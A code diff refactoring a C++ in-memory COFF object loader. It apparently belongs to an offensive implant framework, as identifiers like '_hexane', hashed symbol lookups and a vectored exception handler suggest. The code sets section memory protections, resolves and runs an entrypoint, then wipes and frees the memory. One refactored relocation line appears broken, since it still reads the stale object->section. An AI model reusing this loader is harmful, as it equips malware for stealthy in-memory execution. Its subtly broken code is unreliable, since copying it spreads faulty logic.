@@ -92,19 +92,21 @@ namespace Objects {
             *pointer = (_hexane*) GLOBAL_OFFSET;
             return *pointer ? true : false;
         }
+
+        return false;
     }
 
     BOOL ExecuteFunction(_executable* object, char* function, void* args, size_t size) {
 
-        void *veh_handle = { };
-        void *entrypoint = { };
-        char *sym_name   = { };
+        void *veh_handle = nullptr;
+        void *entrypoint = nullptr;
+        char *sym_name   = nullptr;
 
         bool success = true;
-        uint32_t protect = 0;
 
-        const auto sec_map  = object->sec_map;
-        const auto fn_map   = object->fn_map;
+        const auto sec_map      = object->sec_map;
+        const auto fn_map       = object->fn_map;
+        const auto file_head    = object->nt_head->FileHeader;
 
         // register veh as execution safety net
         if (!(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
@@ -113,10 +115,12 @@ namespace Objects {
         }
 
         // set section memory attributes
-        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
-            const auto section = object->section = SECTION_HEADER(object->buffer, sec_index);
+        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
+            const auto section  = object->section = SECTION_HEADER(object->buffer, sec_index);
 
             if (section->SizeOfRawData > 0) {
+                uint32_t protect = 0;
+
                 switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                 case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
                 case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
@@ -150,14 +154,14 @@ namespace Objects {
         }
 
         // get names from COFF symbol table and find entrypoint
-        for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
+        for (auto sym_index = 0; sym_index < file_head.NumberOfSymbols; sym_index++) {
             const auto symbols = object->symbols;
 
             if (symbols[sym_index].First.Value[0]) {
                 sym_name = symbols[sym_index].First.Name; // inlined
             }
             else {
-                sym_name = (char*)(symbols + object->nt_head->FileHeader.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
+                sym_name = (char*)(symbols + file_head.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
             }
 
             // compare symbolss to function names / entrypoint
@@ -168,7 +172,7 @@ namespace Objects {
         }
 
         // find section where entrypoint can be found and assert is RX
-        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
+        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
             if (entrypoint >= sec_map[sec_index].address && entrypoint < sec_map[sec_index].address + sec_map[sec_index].size) {
 
                 object->section = SECTION_HEADER(object->buffer, sec_index);
@@ -194,25 +198,27 @@ namespace Objects {
         void *pointer   = nullptr;
         size_t size     = 0;
 
-        x_assert(object);
-        x_assert(object->base);
+        if (!object || !object->base) {
+            return;
+        }
+        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &object->base, &object->size, PAGE_READWRITE, nullptr))) {
+            return;
+        }
 
-        x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &object->base, &object->size, PAGE_READWRITE, nullptr));
         MemSet(object->base, 0, object->size);
-
         pointer = object->base;
         size    = object->size;
 
-        x_ntassert(Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE));
-        if (object->sec_map) {
+        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
+            return;
+        }
 
+        if (object->sec_map) {
             MemSet(object->sec_map, 0, object->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
             Free(object->sec_map);
 
             object->sec_map = nullptr;
         }
-
-        defer:
     }
 
     BOOL BaseRelocation(_executable *object) {
@@ -310,28 +316,26 @@ namespace Objects {
         int counter         = 0;
 
         for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            const auto section  = SECTION_HEADER(object->buffer, sec_index);
+            auto reloc          = RELOC_SECTION(object->buffer, object->section);
 
-            object->section = SECTION_HEADER(object->buffer, sec_index);
-            object->reloc   = RELOC_SECTION(object->buffer, object->section);
+            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
+                const auto symbols = object->symbols;
 
-            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
-                _coff_symbol *symbol = &object->symbols[object->reloc->SymbolTableIndex];
-
-                if (symbol->First.Value[0]) {
+                if (_coff_symbol *symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                     MemSet(sym_name, 0, sizeof(sym_name));
                     MemCopy(sym_name, symbol->First.Name, 8);
-
                     buffer = sym_name;
                 }
                 else {
-                    buffer = RVA(char*, object->symbols, object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
+                    buffer = RVA(char*, symbols, object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                 }
 
                 if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                     counter++;
                 }
 
-                object->reloc = object->reloc + sizeof(_reloc);
+                reloc = reloc + sizeof(_reloc);
             }
         }
 
@@ -408,8 +412,6 @@ namespace Objects {
         x_assert(ExecuteFunction(object, entrypoint, args, args_size));
 
         defer:
-        Cleanup(object);
-
         if (!cache) {
             RemoveCoff(object);
         }
